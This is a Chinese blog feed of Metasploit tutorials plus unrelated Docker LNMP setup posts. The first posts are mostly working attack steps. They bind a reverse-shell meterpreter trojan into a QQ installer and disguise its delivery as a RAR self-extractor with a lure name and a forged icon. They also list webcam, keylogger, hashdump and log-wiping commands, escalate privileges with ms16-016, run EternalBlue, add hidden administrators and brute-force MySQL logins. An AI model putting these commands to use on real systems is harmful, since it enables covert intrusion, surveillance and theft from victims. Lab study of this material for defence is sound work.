<pre><code class="language-shell"># 使用MSF生成木马，并与可执行文件进行捆绑
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.137 -f exe -x /home/ubuntu/PCQQ2021.exe -o /home/ubuntu/桌面/QQ.exe

-p：生成木马所使用的payload

windows/meterpreter/reverse_tcp：申明这是一个windows系统下的一个反弹tcp

还可以设置返回的端口，这里就不设置了，默认返回端口是4444

-f： 代表要捆绑的文件类型，这里是一个exe文件

-x：指定你要捆绑的文件的路径及文件名，这里我选择的是/home/ubuntu/里的PCQQ2020.exe

-o：指定生成的木马文件的路径及文件名，这里我把它保存在原路径里，名字就叫QQ.exe
</code></pre>
<ol start="2">
<li>在配置攻击模块之前，可以想办法把木马发送到目标及上面去</li>
<li>配置攻击模块，监听连入木马的目标机</li>
</ol>
<pre><code class="language-shell">#使用exploit/multi/handler监听连入的backdoor
use exploit/multi/handler

#设置对应的payload。
set payload windows/meterpreter/reverse_tcp

#显示所有的设置如果需要的话，可能还需要将LHOST，LPORT,设置成与payload中相同的地址和端口。
show options

set lhost 192.168.200.137
set lport 4444
run
</code></pre>
<ol start="4">
<li>这里直接将QQ.exe发送到目标机上面去，目标机双击运行之后，就中招了，可以看到我们拿到了meterpreter。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617182926105.png" alt="" loading="lazy"></li>
</ul>
<h2 id="2-肉鸡操作meterpreter">2. 肉鸡操作(meterpreter)</h2>
<p>chcp 65001解决乱码问题</p>
<pre><code>ipconfig                #查看IP信息
shell                   #进一步获取权限
info                    #查看已有模块信息
getuid                  #查看权限
getpid                  #获取当前进程的pid
sysinfo                 #查看目标机系统信息
ps                      #查看当前活跃进程
kill &lt;PID值&gt;            #杀死进程
reboot / shutdown       #重启/关机shell #进入目标机cmd shell 
webcam_list             #查看摄像头
webcam_snap             #通过摄像头拍照
webcam_stream           #通过摄像头开启视频
execute                 #在目标机中执行文件execute -H -i -f 
cmd.exe                 #创建新进程cmd.exe，-H不可见，-i交互
migrate &lt;pid值&gt;         #将Meterpreter会话移植到指定pid值进程中
clearav                 #清除windows中的应用程序日志、系统日志、安全日志
enumdesktops            #查看可用的桌面
getdesktop              #获取当前meterpreter 关联的桌面
set_desktop             #设置meterpreter关联的桌面 -h查看帮助
screenshot              #截屏
use espia               #或者使用espia模块截屏 然后输入screengrab
run vnc                 #使用vnc远程桌面连接
</code></pre>
<p>这里虚拟机没有开启摄像头，所以截取了屏幕。<br>
<img src="https://kite-007.github.io/post-images/1617183284436.png" alt="" loading="lazy"></p>
<h3 id="1-利用rar自解压原理运行木马">1. 利用RAR自解压原理运行木马</h3>
<ul>
<li>如果对方就是不运行你所发送的捆绑木马文件，就可以利用RAR自解压的功能来达到目的。<br>
<img src="https://kite-007.github.io/post-images/1617187147948.png" alt="" loading="lazy"><br>
<img src="https://kite-007.github.io/post-images/1617187840287.png" alt="" loading="lazy"><br>
这里有两个文件，其中一个就是刚刚所生成的捆绑木马，一个是txt文档，另外又生成了一个木马文件。<br>
方法：</li>
</ul>
<ol>
<li>全部选中，鼠标右键添加到压缩文件</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617188798912.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>压缩文件的名字可以是充满诱惑性的，比如对方所想要的那个人的联系方式(只是名字)，注意这里的.exe并不是文件类型，后面会说他的用处。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617188964866.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="3">
<li>在文件的高级选项中，有自解压选项，打勾确定，解压路径随便指定，最好是不能被对方发现。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617189101373.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="4">
<li>在这里我想到了多种的组合方式，可以是捆绑后的.exe文件和一个正常的.txt文件，也可以是木马.exe文件和正常的.txt文件，还可以是正常的.exe文件和木马.exe文件，这就是上面所说创建了三个文件的原因。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617189355892.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="5">
<li>在模式选项卡中设置解压时隐藏所有信息，之后确定完成创建。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617189470051.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617189481034.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>将此文件想办法发送到目标主机，之后设置监听反弹并run，等待木马运行连接。</li>
<li>在第四步中，一个txt文件按常理历来说是达不到80多MB的，这样直接就从文件大小直接反映了问题，所以需要伪装一下。</li>
</ol>
<h3 id="2-对rar木马文件进行伪装">2. 对RAR木马文件进行伪装</h3>
<ol>
<li>这里重新弄了两个文件</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192336284.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>解压路径还是那样，最好不要被发现</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192360028.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="4">
<li>这里两个文件的顺序可以颠倒</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192367342.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>解压到临时文件夹是为了隐蔽，但是实际中是不勾选的，全部隐藏要选。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192380588.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="7">
<li>在更新中，更改更新模式为解压并更新文件，更改覆盖模式为覆盖所有文件，这步很重要。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192399285.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="8">
<li>使用BeCyIconGrabber以及Resource Hacker对文件进行伪装。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192415771.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="9">
<li>目标机状况</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617193540401.png" alt="" loading="lazy"></li>
</ul>
<h1 id="2-msf提权">2. MSF提权</h1>
<p><em>提权的漏洞在./exploit/windows/local目录下</em></p>
<ol>
<li>我们使用上述的木马打到了，获得了shell，是user权限，但是权限并不是最高的，但是可以通过一些方式提升到system权限。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617199300467.png" alt="" loading="lazy"></li>
</ul>
<ol start="2">
<li>输入命令。</li>
</ol>
<pre><code class="language-shell"># 把当前的metasploit shell转为后台运行。
background

# 我选择了ms16-016这个漏洞在进行提权
search ms16-016

# 选择漏洞，查看设置参数
use exploit/windows/local/ms16_016_webdav
info | show options
* 可以看见只有一个SESSION参数要设置，是后门连接的id号，我这里是2。

# 进行提权
run | exploit
* 虽然提权成功了 但你getuid下还是看见的是user权限

# 查看进程下面，确认漏洞已经运行的PID进程685
ps

# 根据进程的提示我们确实是system权限，还要用到migrate 命令来迁移到一个指定的进程ID。
migrate 685

# getuid查看，提权成功。

# 添加用户并添加为管理员组
user a a /add
net localgroup administrators a /add

# 用Nmap扫下并没有开启远程登陆3389
nmap -a 192.168.200.137

# 开启目标主机3389
run getgui -e  
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# MSF攻击使用(四)]]></title>
        <id>https://kite-007.github.io/msf-zhi-exploits-mo-kuai-shi-yong/</id>
        <link href="https://kite-007.github.io/msf-zhi-exploits-mo-kuai-shi-yong/">
        </link>
        <updated>2021-03-30T11:10:02.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-exploit%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. exploit简要流程</a></li>
<li><a href="#2-payload%E9%80%89%E6%8B%A9">2. payload选择</a></li>
<li><a href="#3-msf-run%E5%8F%82%E6%95%B0">3. MSF run参数</a></li>
<li><a href="#4-meterpreter">4. meterpreter</a></li>
<li><a href="#5-auxiliary%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">5. auxiliary简要流程</a>
<ul>
<li><a href="#1-syn%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">1. SYN端口扫描</a></li>
<li><a href="#2-smb%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">2. SMB获取系统信息</a></li>
<li><a href="#3-%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB">3. 服务识别</a></li>
<li><a href="#4-%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2">4. 密码嗅探</a></li>
<li><a href="#5-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">5. 身份验证</a></li>
</ul>
</li>
</ul>
(MSF)</p>
<h1 id="1-exploit简要流程">1. exploit简要流程</h1>
<p><strong>以win 7 与ms17-010实例</strong></p>
<ol>
<li>目标主机，需要能够ping通</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105121301.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>攻击前，搜索所需要使用的漏洞</li>
</ol>
<pre><code class="language-shell">search ms17-010
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617103946003.png" alt="" loading="lazy"></li>
<li>辅助模块，可以用于查看是否存在该漏洞。</li>
</ul>
<hr>
<ol start="3">
<li>攻击流程，选择漏洞</li>
</ol>
<pre><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue
</code></pre>
<hr>
<ol start="4">
<li>查看选项，设置变量</li>
</ol>
<pre><code class="language-shell">show options 
show targets

set RHOST 192.168.200.142
set target 0
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105458664.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="5">
<li>寻找想要使用的payload</li>
</ol>
<pre><code class="language-shell">show payloads

set payload windows/x64/exec

show options

# win下添加用户的命令
set CMD net user newuser newuser /add

show options
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105580722.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>测试</li>
</ol>
<pre><code class="language-shell">run
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105617016.png" alt="" loading="lazy"></li>
</ul>
<hr>
<h1 id="2-payload选择">2. payload选择</h1>
<p>payload名称命名规则：<br>
_find_tag：在一个已建立的链接上。<br>
_reverse_tcp：反向连接到攻击者主机。<br>
bind_tcp：监听一个tcp连接<br>
reverse_http：反向链接通过HTTP隧道</p>
<ul>
<li>正向与反向：
<ul>
<li>主机IP：192.168.200.137</li>
<li>目标IP：192.168.200.142</li>
<li>反向：目标IP请求主机IP</li>
<li>正向：主机IP请求目标IP</li>
</ul>
</li>
</ul>
<p>--假如目标IP为公网IP（180.12.12.12），则反向连接{公网IP--》主机IP}不能连接。<br>
--但是正向连接{主机IP--》公网IP}可以连接。</p>
<p>(三次握手)</p>
<ol>
<li>客户端发送SYN包给服务端</li>
<li>服务端收到之后，回SYN和ACK包返回</li>
<li>客户端发送ACK回复收到</li>
</ol>
<hr>
<h1 id="3-msf-run参数">3. MSF run参数</h1>
<ul>
<li>如果入侵之后要想返回操作去使用其他漏洞进行攻击，使用参数</li>
</ul>
<pre><code class="language-shell">-e&lt;opt&gt;要使用的有效载荷编码器。如果没有指定，则使用编码器
-f 强制开发漏洞，而不考虑极小值的大小。
-h 帮助
-j 后台运行。。
-n &lt;opt&gt;使用NOP发生器。如果没有指定，则使用NOP。
-o &lt;opt&gt;在VAR=VALL格式中的逗号分隔选项列表。
-p &lt;opt&gt;使用的有效载荷。如果没有指定，则使用有效载荷。
-t &lt;opt&gt; 要使用的目标索引或名称。如果没有指定，则使用目标。
-z 在成功开发后不与会话交互。
</code></pre>
<hr>
<h1 id="4-meterpreter">4. meterpreter</h1>
<pre><code class="language-shell">session 查看所有肉鸡列表
session -l 查看在线肉鸡列表(可以进行控制的)
exploit 执行渗透攻击或模块来攻击目标。
sessions -i 1打开建立的第一个会话
·getuid 查看UID
·sysinfo 查看攻击主机的系统信息
run hashdump dump 目标主机的hash帐号信息，备份进行暴破PS.查看目标主机进程
migrate 1576(pid)切换自己为管理员，1576是管理员的进程
keyscan_start，开启健盘记录功能
keyscan_dump 查看健盘记录信息
keyscan_stop.停止健盘记录
run getgui-e 远程开启目标主机的远程桌面
run getgui-u cisco -p cisco 远程添加目标主机帐号密码
rdesktop 192.168.1.100 远程桌面
</code></pre>
<h1 id="5-auxiliary简要流程">5. auxiliary简要流程</h1>
<p><strong>以win 7为例</strong></p>
<h2 id="1-syn端口扫描">1. SYN端口扫描</h2>
<p><em>SYN：同步序列编号（Synchronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。</em><br>
<em>TCP连接的第一个包，非常小的一种数据包。SYN 攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。每个机器的欺骗包都要花几秒钟进行尝试方可放弃提供正常响应。</em></p>
<pre><code class="language-shell"># 搜索出关于端口扫描的模块
search portscan 

# 使用SYN扫描模块
use auxiliary/scanner/portscan/syn 

# 显示需要设置的选项
info | show options

# 设置网卡信息 注意网卡名称ens33与eth0等等
set INTERFACE ens33

# 设置扫描端口与目的主机，线程
set PORTS 1-500
set RHOSTS 192.168.200.142
set THREADS 100

run
* 当提示权限不足时使用sudo命令来启动MSF即可解决

quit | exit | back
</code></pre>
<h2 id="2-smb获取系统信息">2. SMB获取系统信息</h2>
<p><em>SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。</em></p>
<pre><code class="language-shell">search scanner smb

use auxiliary/scanner/smb/smb_version

info

set RHOST 192.168.200.142

run
</code></pre>
<h2 id="3-服务识别">3. 服务识别</h2>
<ol>
<li>ssh扫描识别</li>
</ol>
<pre><code class="language-shell">search auxiliary ssh version

use auxiliary/scanner/ssh/ssh_version

info

set RHOSTS 192.168.200.142
* 还可以自己指定范围或者多个端口
set RHOSTS 192.168.200.1-255
set RHOSTS 192.168.200.142 192.168.200.143

run
</code></pre>
<ol start="2">
<li>ftp扫描识别</li>
</ol>
<pre><code>search auxiliary ftp version

use auxiliary/scanner/ftp/ftp_version

info

set RHOSTS 192.168.200.142

run
</code></pre>
<h2 id="4-密码嗅探">4. 密码嗅探</h2>
<p><em>psnuffle</em></p>
<h2 id="5-身份验证">5. 身份验证</h2>
<p><em>login</em></p>
<pre><code>search auxiliary mysql login

use auxiliary/scanner/mysql/mysql_login

info

#找一个测试爆破的用户名字典和密码字典进行爆破

#设置用户字典
set user_file  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  
#设置密码字典
set pass_file   /usr/share/sparta/wordlists/mysql-default-userpass.txt  

run 开始爆破..，知道看到绿色加号即为破解成功！
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# MSF常用命令(三)]]></title>
        <id>https://kite-007.github.io/msf-chang-yong-ming-ling-san/</id>
        <link href="https://kite-007.github.io/msf-chang-yong-ming-ling-san/">
        </link>
        <updated>2021-03-30T09:20:54.000Z</updated>
        <content type="html"><![CDATA[<ol>
<li>在MSF下查看帮助</li>
</ol>
<pre><code># 查看帮助文档
help

# 查看指定命令的帮助说明
? search
</code></pre>
<ol start="2">
<li>search查看命令<br>
<img src="https://kite-007.github.io/post-images/1617096460305.png" alt="" loading="lazy"></li>
</ol>
<pre><code># 以name参数为例
search name:ms17-010
* 这个查询的是名字含有ms17-010的文件

search ms17-010
* 搜索文件名字或者里面的文件内容

# 查找metasploit框架中所有的渗透攻击和其他模块
search name

info //
* 跳转到对应模块查看，展示出指定渗透攻击或模块的相关信息，帮助信息。
eg:info exploit/windows/smb/ms17_010_eternalblue 
* 如果已然在一个模块内部，直接使用info就能查看对应模块的信息。
</code></pre>
<ol start="3">
<li>show列出所有</li>
</ol>
<pre><code>show XXX

# 列出metasploit框架中所有的攻击模块
show exploits

# 列出metasploit框架中所有的攻击载荷
show payloads

# 列出metasploit框架中所有的辅助攻击模块
show auxiliary

# 列出渗透攻击所支持的目标平台
show targets
</code></pre>
<ol start="4">
<li>攻击测试流程(use,set,run)</li>
</ol>
<pre><code># 选择一个攻击或者渗透模块
1. 打开MSF时，MSF的攻击入侵模块有很多，需要选择模块进行使用。
eg：search ms17-010
eg：use exploit/windows/smb/smb_doublepulsar_rce

2. 查看MSF，看MSF需要哪些信息（攻击者ip，攻击者端口）才可以攻击目标。
eg：show options
* 选择模块show之后，发现有yes的选项参数，这里的yes表示必须要提供的参数，no表示可以不进行提供

LHOST：自己
RHOST：目标

3. 要给予MSF命令来告诉MSF，要干什么，要攻击哪里，攻击的目标是什么，攻击之后要干什么。
eg：set RHOST 1.1.1.1
# 还可以查看已经设置了哪些选项。
eg：show options 

4. 运行模块，如果提供payloads给MSF攻击之后要干什莫，那麽MSF就会给一个默认的答案
(主要看攻击脚本的作者有没有添加这个功能)。

5. 可以提供指令给MSF指示入侵之后要拿下目标的权限，CMD或者什么都不做但是要在这之后对目标进行控制。
eg：show payloads
# set payload 之后按下tab键可以查看可以设置的payload
eg：set payload windows/x64/shell/bind_tcp_uuid
eg：show targets
eg：set target 1
# 如果配置错误可以使用unset来清空掉配置

6. 运行，启动攻击
run | exploit
</code></pre>
<ol start="5">
<li>back跳出</li>
<li>exit退出</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# MSF模块笔记(二)]]></title>
        <id>https://kite-007.github.io/msf-mo-kuai-bi-ji-er/</id>
        <link href="https://kite-007.github.io/msf-mo-kuai-bi-ji-er/">
        </link>
        <updated>2021-03-29T13:30:30.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-exploits%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97">1. exploits(漏洞攻击模块)</a></li>
<li><a href="#2-payloads%E6%BC%8F%E6%B4%9E%E8%B4%9F%E8%BD%BD%E6%A8%A1%E5%9D%97">2. payloads(漏洞负载模块)</a></li>
<li><a href="#3-auxiliary%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97">3. auxiliary(辅助模块)</a></li>
<li><a href="#4-encoders%E7%BC%96%E7%A0%81%E5%99%A8%E6%A8%A1%E5%9D%97">4. encoders(编码器模块)</a></li>
<li><a href="#5-nops%E6%97%A0%E6%93%8D%E4%BD%9C%E7%94%9F%E6%88%90%E5%99%A8%E6%A8%A1%E5%9D%97">5. nops(无操作生成器模块)</a></li>
<li><a href="#6-post%E5%BC%80%E5%8F%91%E6%A8%A1%E5%9D%97">6. post(开发模块)</a></li>
<li><a href="#7-evasion">7. evasion</a></li>
</ul>
(MSF模块)</p>
<p><strong>模块目录：/opt/metasploit-framework/embedded/framework/modules</strong><br>
<img src="https://kite-007.github.io/post-images/1617150488021.png" alt="" loading="lazy"></p>
<hr>
<h1 id="1-exploits漏洞攻击模块">1. exploits(漏洞攻击模块)</h1>
<p><em>漏洞攻击模块列表，入侵式攻击模块</em></p>
<ul>
<li>必须要使用payloads模块。exploits模块的NAME命名规则：模块/系统/服务/名称<br>
<img src="https://kite-007.github.io/post-images/1617094549761.png" alt="" loading="lazy"></li>
</ul>
<ol>
<li>exploits漏洞模块下，windows漏洞目录/opt/metasploit-framework/embedded/framework/modules/exploits/windows/smb。以ms17_010_psexec.rb为例子，可以vim进入文档之后进行修改，可以以从网上面查找[MSF].rb脚本之后移入文件保存测试。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617150955806.png" alt="" loading="lazy">
<ul>
<li>这里意思是如果发现了某个漏洞，但是没有对应的.rb文件去进行测试的话，就可以去github上面查找对应漏洞的.rb文件（也并不一定非要是.rb文件），之后移入到目录文件对目标进行测试。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="2-payloads漏洞负载模块">2. payloads(漏洞负载模块)</h1>
<p><em>入侵要做什么</em></p>
<ul>
<li>入侵之后要使用的模块，是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。此模块分为独立(Singles),传输器(Stager),传输体(Stage)三种类型。</li>
</ul>
<hr>
<h1 id="3-auxiliary辅助模块">3. auxiliary(辅助模块)</h1>
<p><em>一般是没有攻击载荷的漏洞攻击</em></p>
<ul>
<li>不属于入侵，用于信息收集以及一些不需要payload的攻击，像DOS，爆破，注入，爬虫，信息收集，资源嗅探等等。此模块的命名规则：模块(可有可无)/系统(可有可无)/服务/名称。</li>
</ul>
<hr>
<h1 id="4-encoders编码器模块">4. encoders(编码器模块)</h1>
<p><em>用于msfvenom -e or msf执行时也能用的shellcode编码</em></p>
<ul>
<li>一种编码转码模块，能够确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符”，还能对攻击模块实现免杀，躲过入侵检测和过滤系统。</li>
<li>像典型的坏字符0x00，会截断后面的内容，从而使攻击载荷无法运行。</li>
</ul>
<hr>
<h1 id="5-nops无操作生成器模块">5. nops(无操作生成器模块)</h1>
<p><em>用来在攻击中添加空指令区，以提高攻击的可靠性</em></p>
<hr>
<h1 id="6-post开发模块">6. post(开发模块)</h1>
<ul>
<li>主要支持在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息，进一步扩展，实现跳板攻击等等</li>
</ul>
<hr>
<h1 id="7-evasion">7. evasion</h1>
<p><em>新模块，主要用于免杀</em></p>
<ul>
<li>MSF 5.0 中更新的一个新的模块，使用这个模块可以轻松创建反杀毒软件的木马。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# MSF渗透工具(一)]]></title>
        <id>https://kite-007.github.io/msf-shen-tou-gong-ju-yi/</id>
        <link href="https://kite-007.github.io/msf-shen-tou-gong-ju-yi/">
        </link>
        <updated>2021-03-29T00:18:00.000Z</updated>
        <content type="html"><![CDATA[<p><strong>MSF 介绍</strong>:<em>MSF 的全称为Metasploit，是一个免费的，可下载的框架，通过它我们可以很容易的获取、开发并对计算机软件漏洞实施攻击。它本身含有数百个已知软件漏洞的专业级漏洞攻击工具。</em></p>
<p><strong>MSF的安装：</strong></p>
<ul>
<li>下载地址：<a href="https://www.metasploit.com/download">https://www.metasploit.com/download</a>
<ul>
<li>(Windows下有一些功能使用不了，所以推荐Linux。)</li>
<li>Linux这里有两种安装方式：</li>
</ul>
</li>
</ul>
<ol>
<li>使用指令安装</li>
</ol>
<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \
  chmod 755 msfinstall &amp;&amp; \
  ./msfinstall
</code></pre>
<ol start="2">
<li>使用下载好的压缩文件。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617019530353.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617019487323.png" alt="" loading="lazy"></li>
<li>切换到压缩文件存放的当前目录，解包安装，切换到该目录运行测试。</li>
</ul>
<pre><code>sudo dpkg -i ./metasploit-framework_6.0.38+20210329102531~1rapid7-1_amd64.deb 

# 切换到该安装目录
cd /opt/metasploit-framework/bin

# kali里面的目录
cd /usr/share/metasploit-framework/bin

# 打开MSF测试
./msfconsole | msfconsole

# MSF更新命令
msfupdate
</code></pre>
<ul>
<li>开始时会问是否使用数据库，选择是(这样会大大提高搜索文件的速度，没问也没关系)。</li>
</ul>
<ol start="3">
<li>MSF之postgresql数据库<br>
<em>postgresql是MSF所使用的数据库，数据库的配置文件在；~/用户/.msf4。安装时会默认创建数据库的账号密码，默认为：账号:MSF@密码:MSF@数据库:MSF（普通权限），也可以自己新建账号或者密码，然后修改XML配置文件</em></li>
</ol>
<pre><code class="language-shell"># XML配置文件目录
cd /home/用户/.msf4
vim ./database.yml

# 查看是否连接数据库
db_status

# 连接数据库
db_connect  【参数】

# 历史扫描文件的路径（导入）
db_import

# 只查看扫描的ip地址
hosts -c address
</code></pre>
<ul>
<li>如果刚刚没有出现创建数据库的提示，在这里切换到普通用户进入MSF的安装目录。</li>
</ul>
<pre><code class="language-shell">cd /opt/metasploit-framework/bin

# 查看数据库命令帮助
./msfdb

# 初始化组件
* init     initialize the component

# 重新初始化删除并重新初始化组件
* reinit   delete and reinitialize the component

# 删除并停止组件
* delete   delete and stop the component

#状态检查组件状态
* status   check component status

# 启动组件
* start    start the component

# 停止组件
* stop     stop the component

# 重新启动组件
* restart  restart the component
</code></pre>
<pre><code class="language-shell"># 这里启用初始化数据库设置账户密码为MSF
msfdb init

# 启动数据库
msfdb start
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# Docker搭建LNMP环境（CentOS-7）]]></title>
        <id>https://kite-007.github.io/docker-da-jian-lnmp-huan-jing/</id>
        <link href="https://kite-007.github.io/docker-da-jian-lnmp-huan-jing/">
        </link>
        <updated>2021-03-27T13:52:18.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-mysql56">1. MySQL:5.6</a></li>
<li><a href="#2-php55-fpm">2. php:5.5-fpm</a></li>
<li><a href="#3-nginx1103">3. nginx:1.10.3</a></li>
</ul>
(Docker)</p>
<h1 id="1-mysql56">1. MySQL:5.6</h1>
<ol>
<li>拉取镜像</li>
</ol>
<pre><code class="language-shell"># 拉取5.6版本的MySQL比较稳定
docker pull mysql:5.6

# 查看刚刚拉取的镜像
docker images
</code></pre>
<ol start="2">
<li>创建并启动容器</li>
</ol>
<pre><code class="language-shell">docker run -id -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 --name=mysql mysql:5.6
# 其实这里为了方便相比于部署那篇已经少了挂载容器的内容
</code></pre>
<ol start="3">
<li>测试</li>
</ol>
<pre><code class="language-shell">docker exec -it mysql /bin/bash
</code></pre>
<h1 id="2-php55-fpm">2. php:5.5-fpm</h1>
<ol>
<li>拉取镜像</li>
</ol>
<pre><code class="language-shell"># 拉取5.5版本的PHP比较稳定
docker pull php:5.5-fpm

# 查看刚刚拉取的镜像
docker images
</code></pre>
<ol start="2">
<li>创建并启动容器</li>
</ol>
<pre><code class="language-shell">docker run -id -v /var/nginx/www/html:/var/www/html -p 9000:9000 --link mysql:mysql --name=phpfpm php:5.5-fpm 
# –link 与另外一个容器建立起联系，这样我们就可以在当前容器中去使用另一个容器里的服务。

docker-php-ext-install pdo_mysql
# 因为后面我要使用pdo模块进行测试，所以我需要自己安装pdo_mysql模块，在docker容器中可以这样来安装

# 然后我们可以通过命令php -m查看我们的php的所有扩展模块，我们可以去看到我们刚刚安装的pdo_mysql扩展也在里面

</code></pre>
<h1 id="3-nginx1103">3. nginx:1.10.3</h1>
<ol>
<li>拉取镜像</li>
</ol>
<pre><code class="language-shell">docker pull nginx:1.10.3
docker images
</code></pre>
<ol start="2">
<li>创建并启动容器</li>
</ol>
<pre><code class="language-shell">docker run -id -p 80:80 --name=nginx \
-v /var/nginx/www/html:/var/www/html \
--link phpfpm:phpfpm --name=nginx nginx:1.10.3

# 然后进入nginx容器，修改nginx的配置文件让它支持php
docker exec -ti xy_nginx /bin/bash

location ~ \.php$ {
        root           /var/www/html;
        fastcgi_index  index.php;
        fastcgi_pass   phpfpm:9000;//这里改成我们之前--link进来的容器，也可以直接用php容器的ip
	    fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
        //如果你的根目录和php容器的根目录不一样，这里的$document_root需要换成你php下的根目录，不然php就找不到文件了
        include        fastcgi_params;     
    }
</code></pre>
<ol start="3">
<li>测试</li>
</ol>
<pre><code class="language-php">&lt;?php
try {
    $con = new PDO('mysql:host=mysql;dbname=test', 'root', '123456');
    $con-&gt;query('SET NAMES UTF8');
    $res =  $con-&gt;query('select * from test');
    while ($row = $res-&gt;fetch(PDO::FETCH_ASSOC)) {
        echo &quot;id:{$row['id']} name:{$row['name']}&quot;;
    }
} catch (PDOException $e) {
     echo '错误原因：'  . $e-&gt;getMessage();
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# Docker服务编排（CentOS-7）*]]></title>
        <id>https://kite-007.github.io/docker-fu-wu-bian-pai-centos-7/</id>
        <link href="https://kite-007.github.io/docker-fu-wu-bian-pai-centos-7/">
        </link>
        <updated>2021-03-27T12:44:16.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E6%9C%8D%E5%8A%A1%E7%BC%96%E6%8E%92%E6%A6%82%E5%BF%B5">1. 服务编排概念</a></li>
<li><a href="#2-docker-compose">2. Docker Compose</a></li>
</ul>
(TOC)</p>
<h1 id="1-服务编排概念">1. 服务编排概念</h1>
<ul>
<li>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停，维护的工作量会很大。<br>
• 要从Dockerfile build image 或者去dockerhub拉取image<br>
• 要创建多个container<br>
• 要管理这些container（启动停止删除）</li>
</ul>
<p><strong>服务编排</strong>：按照一定的业务规则批量管理容器</p>
<ul>
<li>Docker Compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建，启动和停止。使用步骤：</li>
</ul>
<ol>
<li>利用 Dockerfile 定义运行环境镜像</li>
<li>使用 docker-compose.yml 定义组成应用的各服务</li>
<li>运行 docker-compose up 启动应用</li>
</ol>
<h1 id="2-docker-compose">2. Docker Compose</h1>
<p>一、安装Docker Compose</p>
